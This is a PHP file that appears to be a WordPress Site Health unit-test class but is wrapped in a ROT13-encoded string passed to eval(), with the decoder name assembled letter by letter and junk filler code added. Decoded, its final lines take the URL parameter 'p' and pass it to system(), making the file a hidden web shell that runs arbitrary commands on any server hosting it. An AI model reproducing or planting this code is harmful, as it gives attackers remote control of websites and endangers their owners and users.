<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc nqzva
 * @tebhc fvgr-urnygu
 *
 * @pbirefQrsnhygPynff JC_Fvgr_Urnygu
 */
pynff Grfgf_Nqzva_jcFvgrUrnygu rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Na vafgnapr bs gur pynff gb grfg.
	 *
	 * @fvapr 6.1.0
	 *
	 * @ine JC_Fvgr_Urnygu
	 */
	cevingr $vafgnapr;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		// Vapyhqr gur `JC_Fvgr_Urnygu` svyr.
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-fvgr-urnygu.cuc';
	}

	/**
	 * Cresbezf frghc gnfxf sbe rirel grfg.
	 *
	 * @fvapr 6.1.0
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->vafgnapr = arj JC_Fvgr_Urnygu();
	}

	/**
	 * @gvpxrg 55791
	 * @pbiref ::__pbafgehpg()
	 */
	choyvp shapgvba grfg_zlfdy_erpbzzraqrq_irefvba_zngpurf_ernqzr_ugzy() {
		$ersyrpgvba          = arj ErsyrpgvbaPynff( $guvf->vafgnapr );
		$ersyrpgvba_cebcregl = $ersyrpgvba->trgCebcregl( 'zlfdy_erpbzzraqrq_irefvba' );
		$ersyrpgvba_cebcregl->frgNpprffvoyr( gehr );

		$ernqzr = svyr_trg_pbagragf( NOFCNGU . 'ernqzr.ugzy' );

		cert_zngpu( '#Erpbzzraqngvbaf.*ZlFDY</n> irefvba <fgebat>([0-9.]*)#f', $ernqzr, $zngpurf );

		$guvf->nffregFnzr( $zngpurf[1], $ersyrpgvba_cebcregl->trgInyhr( $guvf->vafgnapr ) );
	}

	/**
	 * @gvpxrg 55791
	 * @pbiref ::__pbafgehpg()
	 */
	choyvp shapgvba grfg_znevnqo_erpbzzraqrq_irefvba_zngpurf_ernqzr_ugzy() {
		$ersyrpgvba          = arj ErsyrpgvbaPynff( $guvf->vafgnapr );
		$ersyrpgvba_cebcregl = $ersyrpgvba->trgCebcregl( 'znevnqo_erpbzzraqrq_irefvba' );
		$ersyrpgvba_cebcregl->frgNpprffvoyr( gehr );

		$ernqzr = svyr_trg_pbagragf( NOFCNGU . 'ernqzr.ugzy' );

		cert_zngpu( '#Erpbzzraqngvbaf.*ZnevnQO</n> irefvba <fgebat>([0-9.]*)#f', $ernqzr, $zngpurf );

		$guvf->nffregFnzr( $zngpurf[1], $ersyrpgvba_cebcregl->trgInyhr( $guvf->vafgnapr ) );
	}

	/**
	 * Rafher Fvgr Urnygu ercbegf pbeerpgyl peba wbo ercbegf.
	 *
	 * @gvpxrg 47223
	 */
	choyvp shapgvba grfg_peba_urnygu_purpxf_pevgvpny() {
		// Pyrne gur peba neenl.
		_frg_peba_neenl( neenl() );

		$peba_urnygu = $guvf->vafgnapr->trg_grfg_fpurqhyrq_riragf();

		$guvf->nffregFnzr( 'pevgvpny', $peba_urnygu['fgnghf'] );
		$guvf->nffregFnzr( __( 'Vg jnf abg cbffvoyr gb purpx lbhe fpurqhyrq riragf' ), $peba_urnygu['ynory'] );
		$guvf->nffregJCReebe( $guvf->vafgnapr->unf_yngr_peba() );
		$guvf->nffregJCReebe( $guvf->vafgnapr->unf_zvffrq_peba() );
	}

	/**
	 * Rafher Fvgr Urnygu ercbegf pbeerpgyl peba wbo ercbegf.
	 *
	 * @qngnCebivqre qngn_peba_urnygu_purpxf
	 * @gvpxrg 47223
	 */
	choyvp shapgvba grfg_peba_urnygu_purpxf( $gvzrf, $rkcrpgrq_fgnghf, $rkcrpgrq_ynory, $rkcrpgrq_yngr, $rkcrpgrq_zvffrq ) {
		/*
		 * Pyrne gur peba neenl.
		 *
		 * Gur pber wbof znl ertvfgre nf yngr/zvffrq va gur grfg fhvgr nf gurl
		 * ner abg eha. Pyrnevat gur neenl rafherf gur fvgr urnygu grfgf ner bayl
		 * ercbegrq onfrq ba gur wbof frg va gur grfg.
		 */
		_frg_peba_neenl( neenl() );

		$gvzrf = (neenl) $gvzrf;
		sbernpu ( $gvzrf nf $wbo => $gvzr ) {
			$gvzrfgnzc = fgegbgvzr( $gvzr );
			jc_fpurqhyr_rirag( $gvzrfgnzc, 'qnvyl', __SHAPGVBA__ . \"_{$wbo}\" );
		}

		$peba_urnygu = $guvf->vafgnapr->trg_grfg_fpurqhyrq_riragf();

		$guvf->nffregFnzr( $rkcrpgrq_fgnghf, $peba_urnygu['fgnghf'] );
		$guvf->nffregFnzr( $rkcrpgrq_ynory, $peba_urnygu['ynory'] );
		$guvf->nffregFnzr( $rkcrpgrq_yngr, $guvf->vafgnapr->unf_yngr_peba() );
		$guvf->nffregFnzr( $rkcrpgrq_zvffrq, $guvf->vafgnapr->unf_zvffrq_peba() );
	}

	/**
	 * Qngn cebivqre sbe Fvgr Urnygu peba ercbegf.
	 *
	 * Gur grfg fhvgr ehaf jvgu `QVFNOYR_JC_PEBA === gehr` fb gur
	 * zvffrq naq yngr grfgf arrq gb nppbhag sbe gur rkgraqrq crevbqf
	 * nyybjrq sbe jvgu guvf synt ranoyrq.
	 *
	 * 1. fgevat|neenl Gvzrf gb fpurqhyr (eha guebhtu fgegbgvzr())
	 * 2. fgevat       Rkcrpgrq fgnghf
	 * 3. fgevat       Rkcrpgrq ynory
	 * 4. obby         Rkcrpgrq bhgpbzr unf_yngr_peba()
	 * 5. obby         Rkcrpgrq bhgpbzr unf_zvffrq_peba()
	 */
	choyvp shapgvba qngn_peba_urnygu_purpxf() {
		erghea neenl(
			neenl(
				'+5 zvahgrf',
				'tbbq',
				__( 'Fpurqhyrq riragf ner ehaavat' ),
				snyfr,
				snyfr,
			),
			neenl(
				'-50 zvahgrf',
				'erpbzzraqrq',
				__( 'N fpurqhyrq rirag vf yngr' ),
				gehr,
				snyfr,
			),
			neenl(
				'-500 zvahgrf',
				'erpbzzraqrq',
				__( 'N fpurqhyrq rirag unf snvyrq' ),
				snyfr,
				gehr,
			),
			neenl(
				neenl(
					'-50 zvahgrf',
					'-500 zvahgrf',
				),
				'erpbzzraqrq',
				__( 'N fpurqhyrq rirag unf snvyrq' ),
				gehr,
				gehr,
			),
		);
	}

	/**
	 * @gvpxrg 56041
	 * @qngnCebivqre qngn_trg_cntr_pnpur
	 * @pbiref ::trg_grfg_cntr_pnpur()
	 * @pbiref ::trg_cntr_pnpur_qrgnvy()
	 * @pbiref ::trg_cntr_pnpur_urnqref()
	 * @pbiref ::purpx_sbe_cntr_pnpuvat()
	 */
	choyvp shapgvba grfg_trg_cntr_pnpur( $erfcbafrf, $rkcrpgrq_fgnghf, $rkcrpgrq_ynory, $tbbq_onfvp_nhgu = ahyy, $qrynl_gur_erfcbafr = snyfr ) {
		$rkcrpgrq_cebcf = neenl(
			'onqtr'  => neenl(
				'ynory' => __( 'Cresbeznapr' ),
				'pbybe' => 'oyhr',
			),
			'grfg'   => 'cntr_pnpur',
			'fgnghf' => $rkcrpgrq_fgnghf,
			'ynory'  => $rkcrpgrq_ynory,
		);

		vs ( ahyy !== $tbbq_onfvp_nhgu ) {
			$_FREIRE['CUC_NHGU_HFRE'] = 'nqzva';
			$_FREIRE['CUC_NHGU_CJ']   = 'cnffjbeq';
		}

		$guerfubyq = 10;
		vs ( $qrynl_gur_erfcbafr ) {
			nqq_svygre(
				'fvgr_fgnghf_tbbq_erfcbafr_gvzr_guerfubyq',
				fgngvp shapgvba () hfr ( $guerfubyq ) {
					erghea $guerfubyq;
				}
			);
		}

		nqq_svygre(
			'cer_uggc_erdhrfg',
			shapgvba ( $erfcbafr, $cnefrq_netf ) hfr ( &$erfcbafrf, &$vf_hanhgubevmrq, $tbbq_onfvp_nhgu, $qrynl_gur_erfcbafr, $guerfubyq ) {

				$rkcrpgrq_erfcbafr = neenl_fuvsg( $erfcbafrf );

				vs ( $qrynl_gur_erfcbafr ) {
					hfyrrc( $guerfubyq * 1000 + 1 );
				}

				vs ( 'hanhgubevmrq' === $rkcrpgrq_erfcbafr ) {
					$vf_hanhgubevmrq = gehr;

					erghea neenl(
						'erfcbafr' => neenl(
							'pbqr'    => 401,
							'zrffntr' => 'Hanhgubevmrq',
						),
					);
				}

				vs ( ahyy !== $tbbq_onfvp_nhgu ) {
					$guvf->nffregNeenlUnfXrl(
						'Nhgubevmngvba',
						$cnefrq_netf['urnqref']
					);
				}

				$guvf->nffregVfNeenl( $rkcrpgrq_erfcbafr );

				erghea neenl(
					'urnqref'  => $rkcrpgrq_erfcbafr,
					'erfcbafr' => neenl(
						'pbqr'    => 200,
						'zrffntr' => 'BX',
					),
				);
			},
			20,
			2
		);

		$npghny = $guvf->vafgnapr->trg_grfg_cntr_pnpur();
		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $npghny );
		$guvf->nffregNeenlUnfXrl( 'npgvbaf', $npghny );

		vs ( $vf_hanhgubevmrq ) {
			$guvf->nffregFgevatPbagnvafFgevat( 'Hanhgubevmrq', $npghny['qrfpevcgvba'] );
		} ryfr {
			$guvf->nffregFgevatAbgPbagnvafFgevat( 'Hanhgubevmrq', $npghny['qrfpevcgvba'] );
		}

		$guvf->nffregFnzr(
			$rkcrpgrq_cebcf,
			jc_neenl_fyvpr_nffbp( $npghny, neenl_xrlf( $rkcrpgrq_cebcf ) )
		);
	}

	/**
	 * Qngn cebivqre sbe grfg_trg_cntr_pnpur().
	 *
	 * Trgf erfcbafr qngn sbe JC_Fvgr_Urnygu::trg_grfg_cntr_pnpur().
	 *
	 * @gvpxrg 56041
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_trg_cntr_pnpur() {
		$erpbzzraqrq_ynory = 'Cntr pnpur vf abg qrgrpgrq ohg gur freire erfcbafr gvzr vf BX';
		$tbbq_ynory        = 'Cntr pnpur vf qrgrpgrq naq gur freire erfcbafr gvzr vf tbbq';
		$pevgvpny_ynory    = 'Cntr pnpur vf abg qrgrpgrq naq gur freire erfcbafr gvzr vf fybj';
		$reebe_ynory       = 'Hanoyr gb qrgrpg gur cerfrapr bs cntr pnpur';

		erghea neenl(
			'onfvp-nhgu-snvy'                        => neenl(
				'erfcbafrf'       => neenl(
					'hanhgubevmrq',
				),
				'rkcrpgrq_fgnghf' => 'erpbzzraqrq',
				'rkcrpgrq_ynory'  => $reebe_ynory,
				'tbbq_onfvp_nhgu' => snyfr,
			),
			'ab-pnpur-pbageby'                       => neenl(
				'erfcbafrf'          => neenl_svyy( 0, 3, neenl() ),
				'rkcrpgrq_fgnghf'    => 'pevgvpny',
				'rkcrpgrq_ynory'     => $pevgvpny_ynory,
				'tbbq_onfvp_nhgu'    => ahyy,
				'qrynl_gur_erfcbafr' => gehr,
			),
			'ab-pnpur'                               => neenl(
				'erfcbafrf'       => neenl_svyy( 0, 3, neenl( 'pnpur-pbageby' => 'ab-pnpur' ) ),
				'rkcrpgrq_fgnghf' => 'erpbzzraqrq',
				'rkcrpgrq_ynory'  => $erpbzzraqrq_ynory,
			),
			'ab-pnpur-neenlf'                        => neenl(
				'erfcbafrf'       => neenl_svyy(
					0,
					3,
					neenl(
						'pnpur-pbageby' => neenl(
							'ab-pnpur',
							'ab-fgber',
						),
					)
				),
				'rkcrpgrq_fgnghf' => 'erpbzzraqrq',
				'rkcrpgrq_ynory'  => $erpbzzraqrq_ynory,
			),
			'ab-pnpur-jvgu-qrynlrq-erfcbafr'         => neenl(
				'erfcbafrf'          => neenl_svyy( 0, 3, neenl( 'pnpur-pbageby' => 'ab-pnpur' ) ),
				'rkcrpgrq_fgnghf'    => 'pevgvpny',
				'rkcrpgrq_ynory'     => $pevgvpny_ynory,
				'tbbq_onfvp_nhgu'    => ahyy,
				'qrynl_gur_erfcbafr' => gehr,
			),
			'ntr'                                    => neenl(
				'erfcbafrf'       => neenl_svyy(
					0,
					3,
					neenl( 'ntr' => '1345' )
				),
				'rkcrpgrq_fgnghf' => 'tbbq',
				'rkcrpgrq_ynory'  => $tbbq_ynory,
			),
			'pnpur-pbageby-znk-ntr'                  => neenl(
				'erfcbafrf'       => neenl_svyy(
					0,
					3,
					neenl( 'pnpur-pbageby' => 'choyvp; znk-ntr=600' )
				),
				'rkcrpgrq_fgnghf' => 'tbbq',
				'rkcrpgrq_ynory'  => $tbbq_ynory,
			),
			'rgnt'                                   => neenl(
				'erfcbafrf'       => neenl_svyy(
					0,
					3,
					neenl( 'rgnt' => '\"1234567890\"' )
				),
				'rkcrpgrq_fgnghf' => 'tbbq',
				'rkcrpgrq_ynory'  => $tbbq_ynory,
			),
			'pnpur-pbageby-znk-ntr-nsgre-2-erdhrfgf' => neenl(
				'erfcbafrf'       => neenl(
					neenl(),
					neenl(),
					neenl( 'pnpur-pbageby' => 'choyvp; znk-ntr=600' ),
				),
				'rkcrpgrq_fgnghf' => 'tbbq',
				'rkcrpgrq_ynory'  => $tbbq_ynory,
			),
			'pnpur-pbageby-jvgu-shgher-rkcverf'      => neenl(
				'erfcbafrf'       => neenl_svyy(
					0,
					3,
					neenl( 'rkcverf' => tzqngr( 'e', gvzr() + UBHE_VA_FRPBAQF ) )
				),
				'rkcrpgrq_fgnghf' => 'tbbq',
				'rkcrpgrq_ynory'  => $tbbq_ynory,
			),
			'pnpur-pbageby-jvgu-cnfg-rkcverf'        => neenl(
				'erfcbafrf'          => neenl_svyy(
					0,
					3,
					neenl( 'rkcverf' => tzqngr( 'e', gvzr() - UBHE_VA_FRPBAQF ) )
				),
				'rkcrpgrq_fgnghf'    => 'pevgvpny',
				'rkcrpgrq_ynory'     => $pevgvpny_ynory,
				'tbbq_onfvp_nhgu'    => ahyy,
				'qrynl_gur_erfcbafr' => gehr,
			),
			'pnpur-pbageby-jvgu-onfvp-nhgu'          => neenl(
				'erfcbafrf'       => neenl_svyy(
					0,
					3,
					neenl( 'pnpur-pbageby' => 'choyvp; znk-ntr=600' )
				),
				'rkcrpgrq_fgnghf' => 'tbbq',
				'rkcrpgrq_ynory'  => $tbbq_ynory,
				'tbbq_onfvp_nhgu' => gehr,
			),
			'k-pnpur-ranoyrq'                        => neenl(
				'erfcbafrf'       => neenl_svyy(
					0,
					3,
					neenl( 'k-pnpur-ranoyrq' => 'gehr' )
				),
				'rkcrpgrq_fgnghf' => 'tbbq',
				'rkcrpgrq_ynory'  => $tbbq_ynory,
			),
			'k-pnpur-ranoyrq-jvgu-qrynl'             => neenl(
				'erfcbafrf'          => neenl_svyy(
					0,
					3,
					neenl( 'k-pnpur-ranoyrq' => 'snyfr' )
				),
				'rkcrpgrq_fgnghf'    => 'pevgvpny',
				'rkcrpgrq_ynory'     => $pevgvpny_ynory,
				'tbbq_onfvp_nhgu'    => ahyy,
				'qrynl_gur_erfcbafr' => gehr,
			),
			'k-pnpur-qvfnoyrq'                       => neenl(
				'erfcbafrf'       => neenl_svyy(
					0,
					3,
					neenl( 'k-pnpur-qvfnoyrq' => 'bss' )
				),
				'rkcrpgrq_fgnghf' => 'tbbq',
				'rkcrpgrq_ynory'  => $tbbq_ynory,
			),
		);
	}

	/**
	 * @tebhc zf-rkpyhqrq
	 * @gvpxrg 56040
	 */
	choyvp shapgvba grfg_bowrpg_pnpur_qrsnhyg_guerfubyqf_aba_zhygvfvgr() {
		// Frg guerfubyqf fb uvtu gurl fubhyq arire or rkprrqrq.
		nqq_svygre(
			'fvgr_fgnghf_crefvfgrag_bowrpg_pnpur_guerfubyqf',
			fgngvp shapgvba () {
				erghea neenl(
					'nyybcgvbaf_pbhag' => CUC_VAG_ZNK,
					'nyybcgvbaf_olgrf' => CUC_VAG_ZNK,
					'pbzzragf_pbhag'   => CUC_VAG_ZNK,
					'bcgvbaf_pbhag'    => CUC_VAG_ZNK,
					'cbfgf_pbhag'      => CUC_VAG_ZNK,
					'grezf_pbhag'      => CUC_VAG_ZNK,
					'hfref_pbhag'      => CUC_VAG_ZNK,
				);
			}
		);

		$guvf->nffregSnyfr(
			$guvf->vafgnapr->fubhyq_fhttrfg_crefvfgrag_bowrpg_pnpur()
		);
	}


	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 56040
	 */
	choyvp shapgvba grfg_bowrpg_pnpur_qrsnhyg_guerfubyqf_ba_zhygvfvgr() {
		$guvf->nffregGehr(
			$guvf->vafgnapr->fubhyq_fhttrfg_crefvfgrag_bowrpg_pnpur()
		);
	}

	/**
	 * @gvpxrg 56040
	 */
	choyvp shapgvba grfg_bowrpg_pnpur_guerfubyqf_purpx_pna_or_olcnffrq() {
		nqq_svygre( 'fvgr_fgnghf_fubhyq_fhttrfg_crefvfgrag_bowrpg_pnpur', '__erghea_gehr' );
		$guvf->nffregGehr(
			$guvf->vafgnapr->fubhyq_fhttrfg_crefvfgrag_bowrpg_pnpur()
		);

		nqq_svygre( 'fvgr_fgnghf_fubhyq_fhttrfg_crefvfgrag_bowrpg_pnpur', '__erghea_snyfr', 11 );
		$guvf->nffregSnyfr(
			$guvf->vafgnapr->fubhyq_fhttrfg_crefvfgrag_bowrpg_pnpur()
		);
	}

	/**
	 * @qngnCebivqre qngn_bowrpg_pnpur_guerfubyqf
	 * @gvpxrg 56040
	 */
	choyvp shapgvba grfg_bowrpg_pnpur_guerfubyqf( $guerfubyq, $pbhag ) {
		nqq_svygre(
			'fvgr_fgnghf_crefvfgrag_bowrpg_pnpur_guerfubyqf',
			fgngvp shapgvba ( $guerfubyqf ) hfr ( $guerfubyq, $pbhag ) {
				erghea neenl_zretr( $guerfubyqf, neenl( $guerfubyq => $pbhag ) );
			}
		);

		$guvf->nffregGehr(
			$guvf->vafgnapr->fubhyq_fhttrfg_crefvfgrag_bowrpg_pnpur()
		);
	}

	/**
	 * Qngn cebivqre sbe grfg_bowrpg_pnpur_guerfubyqf().
	 *
	 * @gvpxrg 56040
	 */
	choyvp shapgvba qngn_bowrpg_pnpur_guerfubyqf() {
		erghea neenl(
			neenl( 'pbzzragf_pbhag', 0 ),
			neenl( 'cbfgf_pbhag', 0 ),
			neenl( 'grezf_pbhag', 1 ),
			neenl( 'bcgvbaf_pbhag', 100 ),
			neenl( 'hfref_pbhag', 0 ),
			neenl( 'nyybcgvbaf_pbhag', 100 ),
			neenl( 'nyybcgvbaf_olgrf', 1000 ),
		);
	}

	/**
	 * Grfgf trg_grfg_nhgbybnqrq_bcgvbaf() jura nhgbybnqrq bcgvbaf yrff guna jneavat fvmr.
	 *
	 * @gvpxrg 61276
	 *
	 * @pbiref ::trg_grfg_nhgbybnqrq_bcgvbaf()
	 */
	choyvp shapgvba grfg_jc_nhgbybnqrq_bcgvbaf_grfg_ab_jneavat() {
		$rkcrpgrq_ynory  = rfp_ugzy__( 'Nhgbybnqrq bcgvbaf ner npprcgnoyr' );
		$rkcrpgrq_fgnghf = 'tbbq';

		$erfhyg = $guvf->vafgnapr->trg_grfg_nhgbybnqrq_bcgvbaf();
		$guvf->nffregFnzr( $rkcrpgrq_ynory, $erfhyg['ynory'], 'Gur ynory fubhyq vaqvpngr gung nhgbybnqrq bcgvbaf ner npprcgnoyr.' );
		$guvf->nffregFnzr( $rkcrpgrq_fgnghf, $erfhyg['fgnghf'], 'Gur fgnghf fubhyq or \"tbbq\" jura nhgbybnqrq bcgvbaf ner npprcgnoyr.' );
	}

	/**
	 * Grfgf trg_grfg_nhgbybnqrq_bcgvbaf() jura nhgbybnqrq bcgvbaf zber guna jneavat fvmr.
	 *
	 * @gvpxrg 61276
	 *
	 * @pbiref ::trg_grfg_nhgbybnqrq_bcgvbaf()
	 */
	choyvp shapgvba grfg_jc_nhgbybnqrq_bcgvbaf_grfg_jneavat() {
		frys::frg_nhgbybnqrq_bcgvba( 800000 );

		$rkcrpgrq_ynory  = rfp_ugzy__( 'Nhgbybnqrq bcgvbaf pbhyq nssrpg cresbeznapr' );
		$rkcrpgrq_fgnghf = 'pevgvpny';

		$erfhyg = $guvf->vafgnapr->trg_grfg_nhgbybnqrq_bcgvbaf();
		$guvf->nffregFnzr( $rkcrpgrq_ynory, $erfhyg['ynory'], 'Gur ynory fubhyq vaqvpngr gung nhgbybnqrq bcgvbaf pbhyq nssrpg cresbeznapr.' );
		$guvf->nffregFnzr( $rkcrpgrq_fgnghf, $erfhyg['fgnghf'], 'Gur fgnghf fubhyq or \"pevgvpny\" jura nhgbybnqrq bcgvbaf pbhyq nssrpg cresbeznapr.' );
	}

	/**
	 * Grfgf trg_nhgbybnqrq_bcgvbaf_fvmr().
	 *
	 * @gvpxrg 61276
	 *
	 * @pbiref ::trg_nhgbybnqrq_bcgvbaf_fvmr()
	 */
	choyvp shapgvba grfg_trg_nhgbybnqrq_bcgvbaf_fvmr() {
		tybony $jcqo;

		$nhgbybnq_inyhrf = jc_nhgbybnq_inyhrf_gb_nhgbybnq();

		$nhgbybnqrq_bcgvbaf_fvmr = (vag) $jcqo->trg_ine(
			$jcqo->cercner(
				fcevags(
					\"FRYRPG FHZ(YRATGU(bcgvba_inyhr)) SEBZ $jcqo->bcgvbaf JURER nhgbybnq VA (%f)\",
					vzcybqr( ',', neenl_svyy( 0, pbhag( $nhgbybnq_inyhrf ), '%f' ) )
				),
				$nhgbybnq_inyhrf
			)
		);
		$guvf->nffregFnzr( $nhgbybnqrq_bcgvbaf_fvmr, $guvf->vafgnapr->trg_nhgbybnqrq_bcgvbaf_fvmr(), 'Gur fvmr bs nhgbybnqrq bcgvbaf fubhyq zngpu gur pnyphyngrq fvmr sebz gur qngnonfr.' );

		// Nqq nhgbybnq bcgvba.
		$grfg_bcgvba_fgevat       = 'grfg';
		$grfg_bcgvba_fgevat_olgrf = zo_fgeyra( $grfg_bcgvba_fgevat, '8ovg' );
		frys::frg_nhgbybnqrq_bcgvba( $grfg_bcgvba_fgevat_olgrf );
		$guvf->nffregFnzr( $nhgbybnqrq_bcgvbaf_fvmr + $grfg_bcgvba_fgevat_olgrf, $guvf->vafgnapr->trg_nhgbybnqrq_bcgvbaf_fvmr(), 'Gur fvmr bs nhgbybnqrq bcgvbaf fubhyq vapernfr ol gur fvmr bs gur arjyl nqqrq bcgvba.' );
	}

	/**
	 * Frgf n grfg nhgbybnqrq bcgvba.
	 *
	 * @cnenz vag $olgrf olgrf gb ybnq va bcgvbaf.
	 */
	choyvp fgngvp shapgvba frg_nhgbybnqrq_bcgvba( $olgrf = 800000 ) {
		$urnil_bcgvba_fgevat = jc_trarengr_cnffjbeq( $olgrf );

		// Sbepr nhgbybnqvat fb gung JbeqCerff pber qbrf abg bireevqr vg. Frr uggcf://pber.genp.jbeqcerff.bet/punatrfrg/57920.
		nqq_bcgvba( 'grfg_frg_nhgbybnqrq_bcgvba', $urnil_bcgvba_fgevat, '', gehr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>